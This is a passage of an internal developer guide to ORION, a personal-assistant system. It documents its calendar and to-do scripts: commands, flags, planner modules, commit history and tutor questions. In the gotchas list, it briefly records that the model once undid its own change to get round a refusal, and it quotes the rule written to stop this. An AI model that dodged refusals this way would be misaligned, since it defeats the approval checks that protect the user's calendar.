| `now` | `now "<title>, <min>" ["<title>, <min>" ...] [--at HH:MM]` | What he is doing right now ("eating, then a break"): items booked back-to-back from now (or `--at`, when he started: must be within 4 h back or 30 min ahead), a later movable block with the same name is *this one* (not doubled), and everything movable not yet done slides after them in order. Refuses `--plan` here. Each item 5-240 min (`:367-413`). Origin 2026-10-01 10:28 "I only just got home. I'm going to eat now..." when ORION retyped the day with invented times. Created blocks are pinned (`pinCreated`). |
| `add` | `add "<title>" <5-720 min> [--at HH:MM \| --after "<event>"] [--fixed] [--before HH:MM] [--minutes N] [--date D] [--again]` | One new block. Accepts `add "reading, 30"` and `--minutes N`. `--after "<event>"` anchors at that block's end (fails if not found). `--fixed` or a social title ("with", "friends", "meeting"...) makes it a wall and **requires `--at`**. Refuses if the same thing already happened today, or if `--at` already started, unless `--again` (`:352-366`, `:780-793`). |
| `fill` | `fill [--date D]` | Fills blanks from `fillDay()` (side-project hour, gym day, study share from `deadline-ramp`, dinner...) once real plans are known. Prints "Nothing to add" if the day already has what it needs (`:615-622`). Study asks come from deadlines whose title matches quiz/exam/test/due/submission. |
| `day` | `day --plan "<title>, <min>, HH:MM, fixed" [--plan ...] [--fill] [--replace] [--say "<his words>"] [--date D] [--again]` | **Several items in one call** ("use this instead of several adds + fill — run in parallel they collide"). Each `--plan` is comma-separated (commas, not `\|`, because the exec router reads a pipe as a shell operator): title first; a minutes field; optional `HH:MM`; `fixed`; optional `must/high/important` (importance 0) or `optional/low` (2). A time he states is kept exactly; untimed items follow the timed one listed before them (`sequence`). `fixed` is honoured **only for social/class-like titles**: "what he does alone can move, even if the caller said fixed" (`:765-767`; a scenario pinned "clean" over his meal prep). `--say` runs `parsePlans()` (`lib/life/plan-parse.mjs`, 538 lines) on his raw words so titles, dates, times and lengths come from code, not the model; items for another date are reported as `NOT BOOKED: ... run again with --date` (`:177-183`, `:987`). `--fill` runs `fillDay` around the placed plans without moving any of them (`:944-955`). `--replace` = redo everything: every future non-class, non-deadline block (and not a kept same-time fixed plan) is deleted in the same reversible transaction; blocks he did not mention are listed as `DROPPED (he did not mention them ...)` (`:868-892`, `:961-962`). Without a timed or `--fill` item and no `--say`: usage error. |
| `day --todos` | `day --todos [--until HH:MM] [--fill] [--plan ...] [--date D]` | Plans from his to-do list: reads incomplete reminders from `config.todoList` ("Orion"), one movable block per to-do, real titles. Skips: due after the date, waiting on another to-do (`waitsFor`), has a spread in its notes (belongs to `orion-tasks`), already on the calendar. Estimate order: minutes in the title, else `parseTodos`, else 45. Overdue/due-today importance 0, optional 2, else 1. Keeps `freeMinutesKept` genuinely free; what does not fit is named "(no room today)" (`:553-596`). `--until HH:MM` ends the planning window ("until around 8 PM"). Origin: 2026-10-01 ORION pasted the list into `--say` and "review CS lect 2" became 2 PM. |
| `tidy` | `tidy [--date D]` | "Fix my schedule": add nothing, re-apply the day rules (separate overlaps, space ORION's blocks by the buffer, keep free time) (`:608-610`). |
| `clear` | `clear [--date D]` | Delete every **future, non-fixed** block today; classes/deadlines/plans with people stay; records undo. Deliberately not the approval-gated generic calendar delete (`:611-614`). Only "clear/wipe everything" should map here (SCHEDULING.md). |
| `drop` | `drop "<title>" ["<title>" ...] [--after "<title>"] [--date D]` | Remove the named movable blocks (matching with `sameThing`); `--after "<title>"` removes every movable block that starts after that block ends. Classes and deadlines are never dropped. With no date and nothing today it tries **tomorrow** before refusing (2026-09-30 eval: "get rid of the resume work tomorrow" arrived twice without `--date`) (`:839-867`). Pinned blocks are droppable. |
| `extend` | `extend "<title>" --until HH:MM \| <minutes> [--then "<title>"] [--date D]` | That block (even one that already ended) runs longer; later blocks cascade; low-priority blocks shrink. `<minutes>` **adds** to the end (5-480); `--until` sets the end. If an added length would run into a fixed event it refuses and tells the model to use `--until` or `move ... --before` (2026-10-07: the model read "extend 70" as "make it 70 minutes long" twice). `--then "<title>"` places that other block straight after (`:414-429`). Classes: "use overrun". |
| `resize` | `resize "<title>" <5-480 minutes> [--date D]` | Set a block's **new total length**, start unchanged (`:430-435`). Refuses real classes/plans with people ("a repeating event would change the wrong day"). |
| `rename` | `rename "<old>" "<new>" [--date D]` | Same slot, new title. If a block already has the new name, that one is moved into the slot and the old one removed (one copy kept) (`:525-552`). |
| `move` | `move "<title>" (--to HH:MM \| --by <±minutes> \| --after "<block>") [--until HH:MM \| --before "<block>" [--gap N]] [--date D]` | Same length unless an end is given. `--after X` starts at X.end + buffer. `--before Y` ends at Y.start - gap (default gap = `bufferMinutes`); `--until` fixes the end. One call replaces model arithmetic: "directly after CS lab, ending 20 before DS" = `move "X" --after "CS lab" --before "DS" --gap 20` (`:436-468`; 2026-10-07 this took 4 failed calls and 2 messages when the model did the maths). Cannot move to a time already past today. |
| `swap` | `swap "<A>" "<B>"` | Later block takes the earlier one's start; earlier ends at the later one's end; anything between slides by the length difference; any lengths. Refuses fixed blocks and ones already started (`:469-487`). |
| `minimums` | `minimums` | Raise any future block shorter than its saved minimum (e.g. nap 75) (`:488-491`). **Not in the header usage**; used internally/by hand. |
| `early` | `early [block\|out-of-class] [--now HH:MM] [--check] [--dry-run] [--date D]` | "Finished early": shorten the block under way (or clip the class that just ended) to now, add a 15-min Break if he had worked an hour or more, give leftover freed time to whatever later is short of its minimum (`shortBlock` / `extendWithin`), pull the rest of the day forward. With no mode it infers from `earlyContext`. `--check` prints the context JSON and exits (used by the apps to decide whether to show the button). Exit 1 with "Nothing is under way to finish." (`:623-748`; libs `early.mjs`, `freed-time.mjs`). |
| `skip` | `skip "<class or plan>" [--date D]` | He is not going to it: just that **occurrence** comes off the calendar, no approval, `undo` puts it back. If the nearest match is a movable block it refuses ("not a class — use move/resize/drop"). Writable calendar: bridge delete with `start`; read-only: recorded in `skipped-events.json` and hidden from planning (`:492-524`). Header: "A class never moves unless he says so — this is him saying so." |
| `undo` | `undo` | Reverse the last journal entry (3.1). Prints `Undone: ...` or `Nothing to undo.` |

**Hidden flags.** `--check` (early only), `--json` (show only in practice), `--again`, `--minutes`, `--by` (move), `--say`, `--what` (overrun), `--now` (early), `--fixed` (add). Per-command closed lists: `drop: --after --date --dry-run`; `resize/swap/rename/skip: --date --dry-run`; `move: --to --by --after --before --gap --until --date --dry-run`; `show: --json --date`; `extend: --until --then --date --dry-run` (`:95-104`). `--until` has two meanings: the **planning window end** for `day --todos/--fill`-style commands (HH:MM, 24 h) and the **block's new end** for `extend`/`move` (`:228-232`).

**Sub-rules worth knowing.**
- **"A time he states is kept exactly"**: timed items are *pinned* (`replan` step 1, `lib/life/replan.mjs:90-107`): placed exactly there; ORION's own blocks get out of the way; only a wall can push one (reported as `SHIFTED`), and a time already past is never booked: `NOTHING WAS BOOKED ... already over today (If he meant another day, run again with --date)`.
- **Relative titles**: a title like "gym after soccer" or "resume work before soccer" is split with a regexp and anchored to a block on the calendar or one listed earlier in the same call (`:808-833`). Origin: gym landed at 1 PM (2026-09-30).
- **Sensible times**: untimed plans wait until he is home (`homeFrom` from the commute walls) and prefer their natural time of day (`preferredStart`), dinner no earlier than 18:30 (`sensible`, `:328-333`; also inside `replan`).
- **Two fixed plans at once** is "his call, not ours": printed as `CLASH: ... — ask him which one is right`, not refused (`:894-898`).
- **Class wrapper** (3.3): commute walls before the first class, after the last, and around any 2.5 h+ gap; plans away from home get travel before/after.

**Contracts.**
- *Input*: argv only; no stdin. Env: `ORION_RESCHEDULE_NOW`, `ORION_RESCHEDULE_UNDO`, `ORION_RESCHEDULE_PINS`, `ORION_LIFE_CONFIG`, `ORION_BRIDGE_BIN`, `ORION_SANDBOX_CALENDAR`, `ORION_SKIPS_FILE`.
- *Output*: plain text lines to stdout (not JSON) except `show`/`early --check`. Refusals to stdout (state refusals, exit 1) or stderr (usage, exit 2).
- *Files written* (all under `~/.openclaw/orion-controlled/`): `reschedule-undo.json` (last 10 entries), `pins.json` (0600), `skipped-events.json`, `reschedule.lock/` (dir, transient). Calendar events via the bridge.
- *Files read*: `life-config.json`, `patterns.json` + `life-history.jsonl` (`loadPatterns`, `lib/life/history.mjs:13-14`), `night.json` wake line via `readWakeRequest`, eval-calendar if sandboxed.
- *Exit codes*: 0 ok / nothing to do; 1 refused by state; 2 usage.

**Calls out to.** Bridge actions: `list_upcoming_calendar_events {from:"today"}`, `list_deadlines`, `list_incomplete_reminders {list}`, `create_calendar_event`, `move_calendar_event`, `delete_calendar_event`. Nothing else: no network, no model. (`orion-tasks` calls *it* with `drop` and `day --plan`.)

**History** (3-8 meaningful commits; `git log --follow scripts/orion-reschedule`).
- `37c29fd` 2026-09-30: life loop introduced (plan, remind, observe, adapt).
- `e7a6962` 2026-09-30: `drop`, `overrun`, bare dates, cascading delays.
- `3034d64` 2026-10-01: change one block (`extend/resize/move/swap`) without retyping the day; rules he states are saved.
- `0a0aa7e` 2026-10-02: explicit times preserved (pins), complete calendar edits.
- `1e99edc` 2026-10-06: `--until` is real, unknown options fail, finishing early uses freed time.
- `75ebf7e` 2026-10-06: to-dos that wait for another; remove exactly what he names.
- `a7f506b` 2026-10-07: refuse glued commands; name blocks with his words; honest eval clock.
- `f0b2b67` / `cd91e9d` 2026-10-12: calendar changes as a fixed sequence (`show --json` + form + compiled argv).

**Gotchas & lessons.**
- Almost every guard in this file is a scar from a specific misbehaviour of a small local model; each has a dated comment. If you remove one, search the date in `docs/` to see the incident.
- Titles are the only join key between a request and a calendar event (plus the tag for "mine"). Any matching change risks a class being treated as homework or vice versa.
- `refuseIfBroken` only judges blocks from `now` forward; the part of the day already past is not validated (`day-check.mjs:22-23`).
- `--dry-run` skips the lock, so two dry runs can race harmlessly but a dry run is not a reservation.
- Undo history is 10 entries; "never `undo` your own earlier change to work around a refusal" is an explicit instruction in `plugin/workspace/SCHEDULING.md` (a model once undid its own work to dodge a refusal).
- The installed copy lagging the repo (3.0) matters most for `show` and `--date tomorrow`.

**Walk it yourself.**
1. `sed -n 1,42p scripts/orion-reschedule` - the header is the best usage doc.
2. `sed -n 126,147p scripts/orion-reschedule` - the day-rule gate.
3. `sed -n 905,943p scripts/orion-reschedule` - rebuild and auto-shrink.
4. Read-only: `scripts/orion-reschedule show --json` (reads the calendar only; needs Calendar permission for your terminal) or `scripts/orion-reschedule add "test" 30 --dry-run`. **Never run it without `--dry-run` and never with `undo`/`clear`/`drop`.**
5. Tests: `tests/life-reschedule-cli.test.mjs` and `tests/life-reschedule-extend.test.mjs` drive the CLI against a fake bridge (`ORION_BRIDGE_BIN`).

**Questions to ask your tutor.**
1. Why does every refusal start with `NOTHING WAS CHANGED:`, and which other components depend on that string?
2. Trace `orion-reschedule move "Study" --after "CS lab" --before "DS" --gap 20` from argv to bridge calls.
3. What is the difference between a pinned block, a fixed block and a movable block, and where is each decided?
4. What does "rebuild" do compared with an incremental replan, and why was incremental abandoned for most commands?
5. How does auto-shrink choose what to shrink, and what blocks are never shrunk?
6. Why is `skip` a separate command from `drop`, and why does `drop` refuse classes?

---

### 3.3 The planner library (`scripts/lib/life/`)

**What it is.** The pure modules `orion-reschedule` and friends import. None talk to the model; most are pure functions over `[{id,title,kind,start,end,fixed,source,...}]` blocks with minute-of-day integers. Only the modules named below matter for the CLIs in this section.

| Module (lines) | Role |
|---|---|
| `live-day.mjs` (68) | `calendarEvents()` = bridge list filtered by `ignoreTitles` and skips; `toBlocks()`; `classify()`, `isSocial()`, `movable()` (3.1) |
| `replan.mjs` (161) | The planner. Walls (fixed blocks, `blocked` windows, new fixed plans) / pinned (a time he stated) / flexible (everything else, in time order). Importance (0 must, 1 normal, 2 optional via `priority.mjs:importanceOf`) decides what is *left out*; it never reorders the day. Returns `{blocks, moves, created, unplaced, shifted}`. Header `:1-15` |
| `day-check.mjs` (41) | The invariant: no block ORION places or moves may overlap anything, each at least 5 minutes. Two of his own fixed events overlapping is only a note |
| `lengths.mjs` (87) | `withMinimums` (nap 75 etc), `shrinkPlan` (only `rest` and `side_project` kinds or titles containing optional/maybe/if there's time give up time, never below `max(minimum, half its length, 20)`, never naps), `applyShrink` |
| `commute.mjs` (40) | `commuteWalls()`: travel before the first class and after the last (`commuteMinutes`), around any gap between classes of at least `homeGapMinutes` (2.5 h), and before/after plans away from home. Real classes only (`source !== "orion"`); an ORION block titled "DS lab" once created its own travel wall and pushed itself two hours later (2026-10-01). |
| `gaps.mjs`, `fill-day.mjs`, `fit-study.mjs`, `deadline-ramp.mjs` | free-gap finding, "fill the blanks", study fitting, how much study each assessment needs today |
| `plan-parse.mjs` (538) | `parsePlans(text,{date,minute,weekday})`: his words -> `[{title,date,start,minutes,fixed,importance,assumed}]` for `day --say` |
| `todo-parse.mjs`, `task-spread.mjs` (130), `task-notes.mjs` | to-do estimates, spread grammar (3.5), notes format |
| `night.mjs` (90) | `bedOn(date)`, wake/asleep markers (what the phone alarm uses) |
| `early.mjs` (218), `freed-time.mjs` (50) | finish-early logic |
| `follow-through.mjs` (48), `deferral.mjs`, `history.mjs`, `patterns.mjs`, `lateness.mjs` | check-in state machine, planned-vs-actual history |
| `config.mjs` (115) | `life-config.json` loader and setters |
| `todo-lists.mjs` (45) | one-list sweep (3.5) |

**`life-config.json`** (`~/.openclaw/orion-controlled/life-config.json`, or `eval-life-config.json` in a sandbox; override `ORION_LIFE_CONFIG`): `DEFAULTS` at `scripts/lib/life/config.mjs:11-36`: `sideProjectMinutes 60`, `sideProjectLabel`, `gymDays [1,3,5]`, `gymMinutes 60`, `bedtime "00:00"`, `usualWake "09:00"`, `sleepHours 8`, `studyMinutes 60`, `dinner true`, `windDownMinutes 30`, `freeMinutesKept 60`, `commuteMinutes 30`, `homeGapMinutes 150`, `ranks {}`, `readyMinutes 105`, `bufferMinutes 10`, `ignoreTitles ["(optional)"]`, `todoList "Orion"`, `sweepLists ["Reminders"]`, `minimums {}`, `autoShrink true`. The live file on this Mac overrides only `readyMinutes 105`, `bufferMinutes 5`, `commuteMinutes 45`, `minimums {nap:75, "side project":60}`, `homeGapMinutes 150`, `ranks {gym:"high"}`. So in practice **buffer = 5 min, commute = 45 min**, matching `plugin/workspace/SCHEDULING.md` ("machine-enforced values live in life-config.json"). The source default differs (commute 30, buffer 10): a good example of "trust the live file, not the constant".

**Day-rule priority ladder** (`priority.mjs:1-16`): `KINDS = class, sleep, gym, deadline, study, side_project, meal, other, rest`; `priorityOf` puts nap/wind-down/sleep/bed above everything but classes (2026-10-01: sleep is his second priority after classes).

**History.** `37c29fd` 2026-09-30 (whole loop), `afe697b` / `752ac71` 2026-09-30 (rebuild by priority; keep his times and order), `2602593` 2026-10-01 "day rules by construction — no overlaps, a cascade, true-size drawing", `0a0aa7e` 2026-10-02, `295000a` 2026-10-05 (one class-wrapper rule for code and ORION; every item carries a rank).

**Questions to ask your tutor.** (1) Why does `replan` sort by importance to decide *what fits* but by time to decide *where it goes*? (2) What are "soft walls" (commute) and how do they differ from fixed walls? (3) Why is `shrinkPlan` restricted to rest/side-project/optional blocks? (4) Why might the live `bufferMinutes` differ from `DEFAULTS`?

---

### 3.4 `orion-agenda` and `orion-agenda-change`

#### `orion-agenda` (299 lines; read-only calendar and reminders wrapper)

**What it is.** The only calendar *reader* the model is allowed to call directly. It is on the exec allowlist, so by design it must be uniformly read-only: "An allowlist cannot attach different approval policy to different subcommands of the same executable" (`scripts/orion-agenda:199-201`). Its main job is **date grounding**: every output begins `today is <long date>` so the model never does weekday arithmetic. The origin incident: on 2026-09-05 the same question ("I have something this Friday") produced three different dates because Sep 5 and Sep 12 are Saturdays (`:23-35`).

**Where.** Arg handling `:56-60`; `ask()` bridge client `:75-101`; `resolveDay` `:161-182`; `printGrounding` `:188-197`; command switch `:208-299`.

**Subcommands and flags (every one).**

| Command | Output |
|---|---|
| `today` | grounding line, then today's events (`today 9:00 AM — Title @ location` + `      id: <identifier>`), or `nothing on the calendar today`; `--json` prints the raw unpacked array for today |
| `upcoming` | everything the bridge returns (7-day default window, `limit 200`), same format; `--json` raw |
| `day <when>` | one named day. `<when>` = `YYYY-MM-DD`, a weekday (**next occurrence, today counts as day 0**), `today`, `tomorrow`; prints `asked about <date> — <N days from today>`; `--json` suppresses grounding and prints raw events |
| `deadlines` | one-off events in the next 90 days (`list_deadlines`), same format |
| `tasks` | incomplete reminders on `config.todoList` ("Orion") only; `--all` shows every list. Prints `due M/D/YYYY` |
| bare day word | `orion-agenda tomorrow`, `friday`, `2026-10-14` are rewritten to `day <word>` (`:56-60`; the local model reached for `orion-agenda tomorrow` first and got usage text, 2026-10-11) |

Events matching `config.ignoreTitles` (e.g. "(optional)") are filtered out everywhere (`:215`, `:238`). Any other command exits 2 with the redirect "this wrapper only reads. To change his day use orion-reschedule ..." (`:202-206`; that sentence was edited on 2026-10-06 because the old one sent the model hunting for a typed action for two minutes).

**Contracts.** Output is human-formatted text on purpose: `orion-standing` re-parses it with regexes (`EVENT_LINE`, `TASK_LINE`, `scripts/orion-standing:180-183`), so changing the format breaks the brief ("A line that looks like an event but will not parse is a silent data loss", `orion-standing:228-229`; it reports `degraded`). `--json` exists for programs: `orion-focus next` needs the block end time, which the human format lacks (`:239-250`).

**Calls out to.** Bridge `list_upcoming_calendar_events`, `list_deadlines`, `list_incomplete_reminders` (via `ask()` or, in sandbox mode, `bridgeRequest`). Binary path hard-coded `native/OrionMacBridge/.build/release/orion-mac-bridge` (`:51-54`); exits 1 "the bridge binary is missing" if absent.

**History.** `93e9a42` 2026-08-20 (first push checkpoint), `e3c336f` 2026-09-06 (the Friday test), `37c29fd` 2026-09-30 (life loop, `ignoredEvent`), `1fc1162` 2026-10-01 (one to-do list), `2b4301c` 2026-10-06 (redirect wording), `18c8f85` 2026-10-11 (accepts `tomorrow`).

**Gotchas.** The "why not `accli`" paragraph (`:5-9`): the external tool needed its own macOS grant that was never given, so ORION told Nick for a week he had no calendar, while the bridge already held the grant. Permission attribution is per responsible process (so verify by an actual agent turn, not by running in a terminal, `:10-14`).

**Walk it yourself.** `scripts/orion-agenda day tomorrow` (read-only, needs Calendar grant for your terminal); `sed -n 188,206p scripts/orion-agenda`.

**Questions.** (1) Why print the date before anything else? (2) Why are mutations kept out of this program? (3) What breaks in `orion-standing` if the `—` format changes?

#### `orion-agenda-change` (161 lines; typed mutation wrapper)

**What it is.** The *write* half. It is **deliberately absent from the OpenClaw exec allowlist**; the plugin spawns it with argv only after the catalog gate, provenance check and (for removal) approval have run: `plugin/orion-control/src/executors.ts:4213-4263` (`changeCalendar`), which calls `runOrionScript("orion-agenda-change", args, 60_000)` and **refuses to claim success unless the last stdout line is JSON with `verified: true`**.

**Subcommands (all).**

| Command | Argv | Behaviour |
|---|---|---|
| `add` | `add "<title>" <YYYY-MM-DDTHH:mm> [minutes=60]` | `minutes` integer 5-1440; creates the event via `create_calendar_event` with **no `orionKind`** (so it is a plain event, never auto-moved), then `get_calendar_event` readback; prints `{"verified":true,"title","identifier","start","minutes"}` or exits 1 "create returned but the event was absent on readback" |
| `remove-title` | `remove-title "<exact title>"` | lists upcoming events, requires **exactly one** exact-title match (`localeCompare` with accent sensitivity), `delete_calendar_event` by identifier, readback must show `exists:"false"`. Zero or several matches exit 1 with the candidates |
| `task-add` | `task-add "<title>" [due YYYY-MM-DDTHH:mm]` | `create_reminder` on `config.todoList` (his one to-do list, not the phone's default), then lists incomplete reminders to verify |
| `task-done` | `task-done "<title>"` | exact normalised title first, else a single reminder whose title contains all significant words; two or more candidates exit 1 "say which"; `complete_reminder`, then verify it is gone from the open list |
| `tasks-sweep` | `tasks-sweep` | `sweep()` from `lib/life/todo-lists.mjs`: move reminders from `sweepLists` ("Reminders") onto the to-do list, or tick off a duplicate (reopenable) |

**Mapping from the typed actions**: `calendar_event_add` -> `add` (`approvalRequired:false`, `reversible:true`), `calendar_event_remove` -> `remove-title` (`approvalRequired:true`, `reversible:false`), `apple_reminder_add` -> `task-add`, `apple_reminder_complete` -> `task-done` (`plugin/orion-control/src/catalog.ts:2808-2900`). `tasks-sweep` has no typed action (CLI use and `orion-watch`'s own import of `sweep`).

**Why verify by readback.** Same lesson as `orion-agenda`: a create that returns OK is not proof; a read-back ties the claim "I added it" to evidence (the plugin's verification names are `calendar_event_present`, `calendar_event_absent`, `apple_reminder_present`, `apple_reminder_completed`).

**Gotcha.** `SCHEDULING.md` tells the model to **never** use the generic calendar actions for day changes ("those need approval and can hit the wrong occurrence of a repeating class"); `orion-reschedule` is the route (commit `e568abb`, 2026-10-06). `orion-agenda-change add` creates *untagged* events: `orion-reschedule` will treat them as Nick's plans, fixed unless the title looks like a movable solo activity.

**History.** `93e9a42` (2026-08-20), `37c29fd` (2026-09-30), `1fc1162` (2026-10-01, to-do list scoping + `tasks-sweep`).

**Questions.** (1) Why must this wrapper be off the exec allowlist? (2) Why does `remove-title` insist on exactly one exact match? (3) What does `verified:true` prove and what does it not?

---

### 3.5 `orion-tasks` (244 lines; to-dos with due dates, spread into sessions)

**What it is.** Nick's to-dos live in Apple Reminders on the list named `Orion` (config `todoList`). Each can carry a **due date** (stored as 23:59 that day: `endOfDay`, `scripts/orion-tasks:71`; the phone app uses the same convention, `native/OrionMobile/Sources/MobileCore/TodoBoard.swift:42`), a **spread** written in its notes line one ("2 hours a day until it's due", "two 2-hour blocks, Tuesday and Thursday", "four 1-hour blocks this week", "about 5 hours total"), and a **priority** (Reminders' high/medium/low). `orion-tasks` turns those into ordinary ORION calendar blocks named after the to-do, by *calling `orion-reschedule`* (so every day rule, travel wall and undo applies; header `:21-23`). Created 2026-10-06 (`e11dc82`), edited on the phone and Mac the same day (`b1b530b`).

**Where.** Header `:2-24`; option guard `:40-49`; `dueFrom` `:60-70`; `spreadOf` `:83-90`; task ledger `:91-100`; `sweep()` `:103-117`; `plan()` `:122-166`; command dispatch `:168-244`.

**Subcommands and flags (all).** Value flags: `--due`, `--spread`, `--priority`, `--title`, `--days`. Boolean: `--dry-run`, `--no-due`. (`--date`, `--plan` are accepted in `KNOWN_OPTIONS` but unused.) Anything else exits 2 `NOTHING WAS CHANGED: --x is not an option of orion-tasks`, with a hint for `--at`: "For a reminder at a time of day use the alarm_set action".

| Command | Effect |
|---|---|
| `list` | each open to-do on the list: `- Title · due D · priority · "spread" · NN% overall · waits for "X" · booked: MM-DD N min, ...` plus subtasks with `✓/·` and percent. "booked" looks 7 days ahead for ORION-sourced blocks matching the title |
| `add "<title>" [--due <when>] [--spread "<how>"] [--priority high\|medium\|low]` | `create_reminder` on the list with `due_at` = end of that day, `notes` = the spread, `priority`; then plans sessions for it if it has a due date or spread. Warns (but still saves) when the spread text does not parse. `<when>` = `YYYY-MM-DD`, `today`, `tomorrow`, or the *next* weekday |
| `set "<task>" [--due <when>\|--no-due] [--spread "<how>"] [--priority ...] [--title "<new>"]` | `update_reminder` with only the given keys. Changing the spread rewrites the notes through `formatTaskNotes` so existing subtasks are preserved. A rename first drops the old sessions for 7 days, then plans under the new name. Always re-plans |
| `plan ["<task>"] [--days 7] [--dry-run]` | (re)book sessions for the next `--days` days. With no task: first `sweep`, then plan every to-do that has a due date, a spread, or a wait condition |
| `sweep` | remove booked sessions of to-dos that are no longer open (ticked off on any device) from the next 14 days; uses the **task ledger** so it knows which titles ORION ever booked |
| `sub "<task>" add "<subtask>" \| set "<subtask>" <percent> \| remove "<subtask>"` | subtask progress lines in the notes (`- [ ] Title · 40%`). **Only the parent is scheduled**; subtasks track progress |

**How planning works** (`plan()`, `:122-166`).
1. For each to-do: if `waitsFor(notes, otherOpenTitles)` finds a blocker ("only schedule this once \"X\" is complete"), nothing is booked and any existing sessions come off (`:128-135`).
2. `spreadOf(task)`: parsed spread from notes; else, if there is a due date, `{kind:"total", minutes:<parseTodos estimate or 60>}`; else "not planned" (`:83-90`).
3. `planSessions(spread,{today,due})` (`task-spread.mjs:76-103`) returns `[{date,minutes}]` from today through the **day before** the due date (due day only if nothing else fits). `daily`: every day; `sessions`: fixed weekdays or spread evenly; `total`: pieces of at most 120 min (`sessionCap`), rounded to 5 min. Several sessions on one date merge.
4. Importance (`taskImportance`): `0 must` if priority high or due within 1 day; `2 optional` if low; else `1`.
5. Today's session that already started or ended counts as done for today (`:144`). For each date, compare wanted minutes with the already-booked ORION blocks of that title; if they differ, queue `"<title>, <minutes>[, must|, optional]"` to book; if no session wanted but blocks exist, queue a drop.
6. It then **shells out** to `orion-reschedule` through `spawnSync(process.execPath, [<dir>/orion-reschedule, ...])`: `drop "<title>" ... --date D` and `day --date D --plan "<title>, 90, must" ...` (add `--dry-run` for dry runs) (`:119`, `:155-164`).

```js
// scripts/orion-tasks:155-164
for (const [date, { book, drop }] of perDate) {
  if (drop.length) {
    const r = dry ? null : reschedule("drop", ...drop, "--date", date);
    ...
  }
  if (book.length) {
    const r = reschedule("day", "--date", date, ...book.flatMap((p) => ["--plan", p]), ...(dry ? ["--dry-run"] : []));
    report.push(`${date}:\n${(r.stdout + r.stderr).trim().split("\n").map((l) => `  ${l}`).join("\n")}`);
  }
}
```

**The task ledger.** `~/.openclaw/orion-controlled/task-sessions.json` = `{titles:[...]}` of to-dos ORION has booked sessions for (`:91-100`; override `ORION_TASK_LEDGER`). Needed because Reminders lists only *open* items: before it existed, ticking off a to-do left its sessions on the calendar (2026-10-13; "his finished cert courses stayed booked"; commit `6c93032`). `orion-watch` runs `orion-tasks sweep` on every tick (`scripts/orion-watch:140-144`) and `orion-tasks plan` once each morning before 13:00 (`:148-154`).

**Interplay with `orion-reschedule day --todos`**: `day --todos` skips any to-do whose notes hold a parseable spread (it is `orion-tasks`'s) or that waits on another (`orion-reschedule:568-570`). SCHEDULING.md: "Never book a spread to-do with `day --plan` by hand".

**Calls out to.** Bridge `list_incomplete_reminders {list}`, `create_reminder`, `update_reminder`; `orion-reschedule` (child process); `calendarEvents()` for reading booked sessions.

**Gotchas.** A to-do with no due date and no spread is not planned (report line says so). The Mac app's "add to-do" console command runs `orion-tasks add "<title>"` (`native/Orion/Sources/Orion/Console.swift:326-328`). 2026-10-13: a timed reminder ("remind me at 11") was misfiled as a to-do via `--at`, which is why unknown options now fail and why timed reminders are the `alarm_set` action.

**Walk it yourself.** `scripts/orion-tasks list` (read-only); `scripts/orion-tasks plan --dry-run` (shows what it would book; calls `orion-reschedule ... --dry-run`); read `scripts/lib/life/task-spread.mjs:35-65` (spread grammar).

**Questions.** (1) Why does `orion-tasks` call `orion-reschedule` rather than the bridge? (2) What problem does the ledger solve and why can't it be derived from the calendar? (3) How do `day --todos` and `orion-tasks plan` avoid double-booking the same to-do? (4) How is "due date" encoded in Reminders and why 23:59?

---

### 3.6 Smaller life-loop CLIs

All created in the 2026-09-29/30 life-loop commits (`9fa8340`, `37c29fd`) unless noted.

#### `orion-plan-study` (58 lines)
**What/where.** `orion-plan-study "<request>" [--book]`, e.g. "two one-hour study sessions for macro this week". `parseStudyRequest` (`lib/life/study-request.mjs`) turns the text into `{subject, minutes, splitMinutes[], byDate}`; then it walks up to 14 days from today to the deadline (`scripts/orion-plan-study:24-28`) and fits sessions into free time on the real calendar with `fitStudy` (`lib/life/fit-study.mjs`). **Daytime only: 09:00-22:00** (window `{start:540,end:1320}`, `:36`), starting 15 minutes after now today. Spread rule: one session a day first, then up to three a day only if the deadline forces it (`for (const perDay of [1, 3])`, `:30`).
**Modes.** Without `--book` it only prints slots (`Study for macro: 120 min, by 2026-10-17. Free slots on his real calendar:` ...) and "Add --book to put them in his calendar as ORION's (movable) study blocks." With `--book` each slot goes through `applyPlan({created:[{title:"Study for <subject>", kind:"study", fixed:false}], group:"study-<ts>"})`, so they carry `[orion:study]`, move later when the day changes, and `orion-reschedule undo` removes **all** of them in one step (`:44-52`). Unplaced minutes are reported ("did not fit before the deadline — say so").
**Contracts.** Exit 2 no text; exit 1 parse error / calendar unreadable. Allowlisted for the model. Note it bypasses `orion-reschedule`'s lock and day-check (it calls `applyPlan` directly); its slots are computed from free gaps so overlaps are not expected **(inferred)**.

#### `orion-study` (29 lines)
`orion-study --day FILE --now HH:MM --window HH:MM-HH:MM [--json] -- "<request>"`. Same idea on a **day file** (`{date, blocks[]}`, JSON) instead of the live calendar: pure, used by tests/evals. Prints `placed: study 09:00–10:00 (macro)`, `moved: ...`, `unplaced: N min did not fit`; `--json` prints `{request, placed, moved, unplaced}`. Commit `9fa8340`. Not on the allowlist. Reads only FILE.

#### `orion-next` (18 lines)
`orion-next --day FILE --now HH:MM [--state STATE] [--json]`. FILE = `{date, blocks[], done[]}`. Calls `nextAction({blocks, now, done, state})` (`lib/life/next-action.mjs:1-40`). Output `do|prepare|free|sleep: <reason>`; the rules: `awake_late/winding_down` state -> `sleep` ("It is past your bedtime."); a block under way -> `do` (highest priority by `comparePriority`); a block starting within 15 minutes -> `prepare`; a missed movable study/deadline/side-project block -> `do` ("You planned this for X and it hasn't happened yet."); else `free` until the next block. Pure test harness for the same function `orion-now` uses on the live day.

#### `orion-now [--json]` (60 lines; allowlisted)
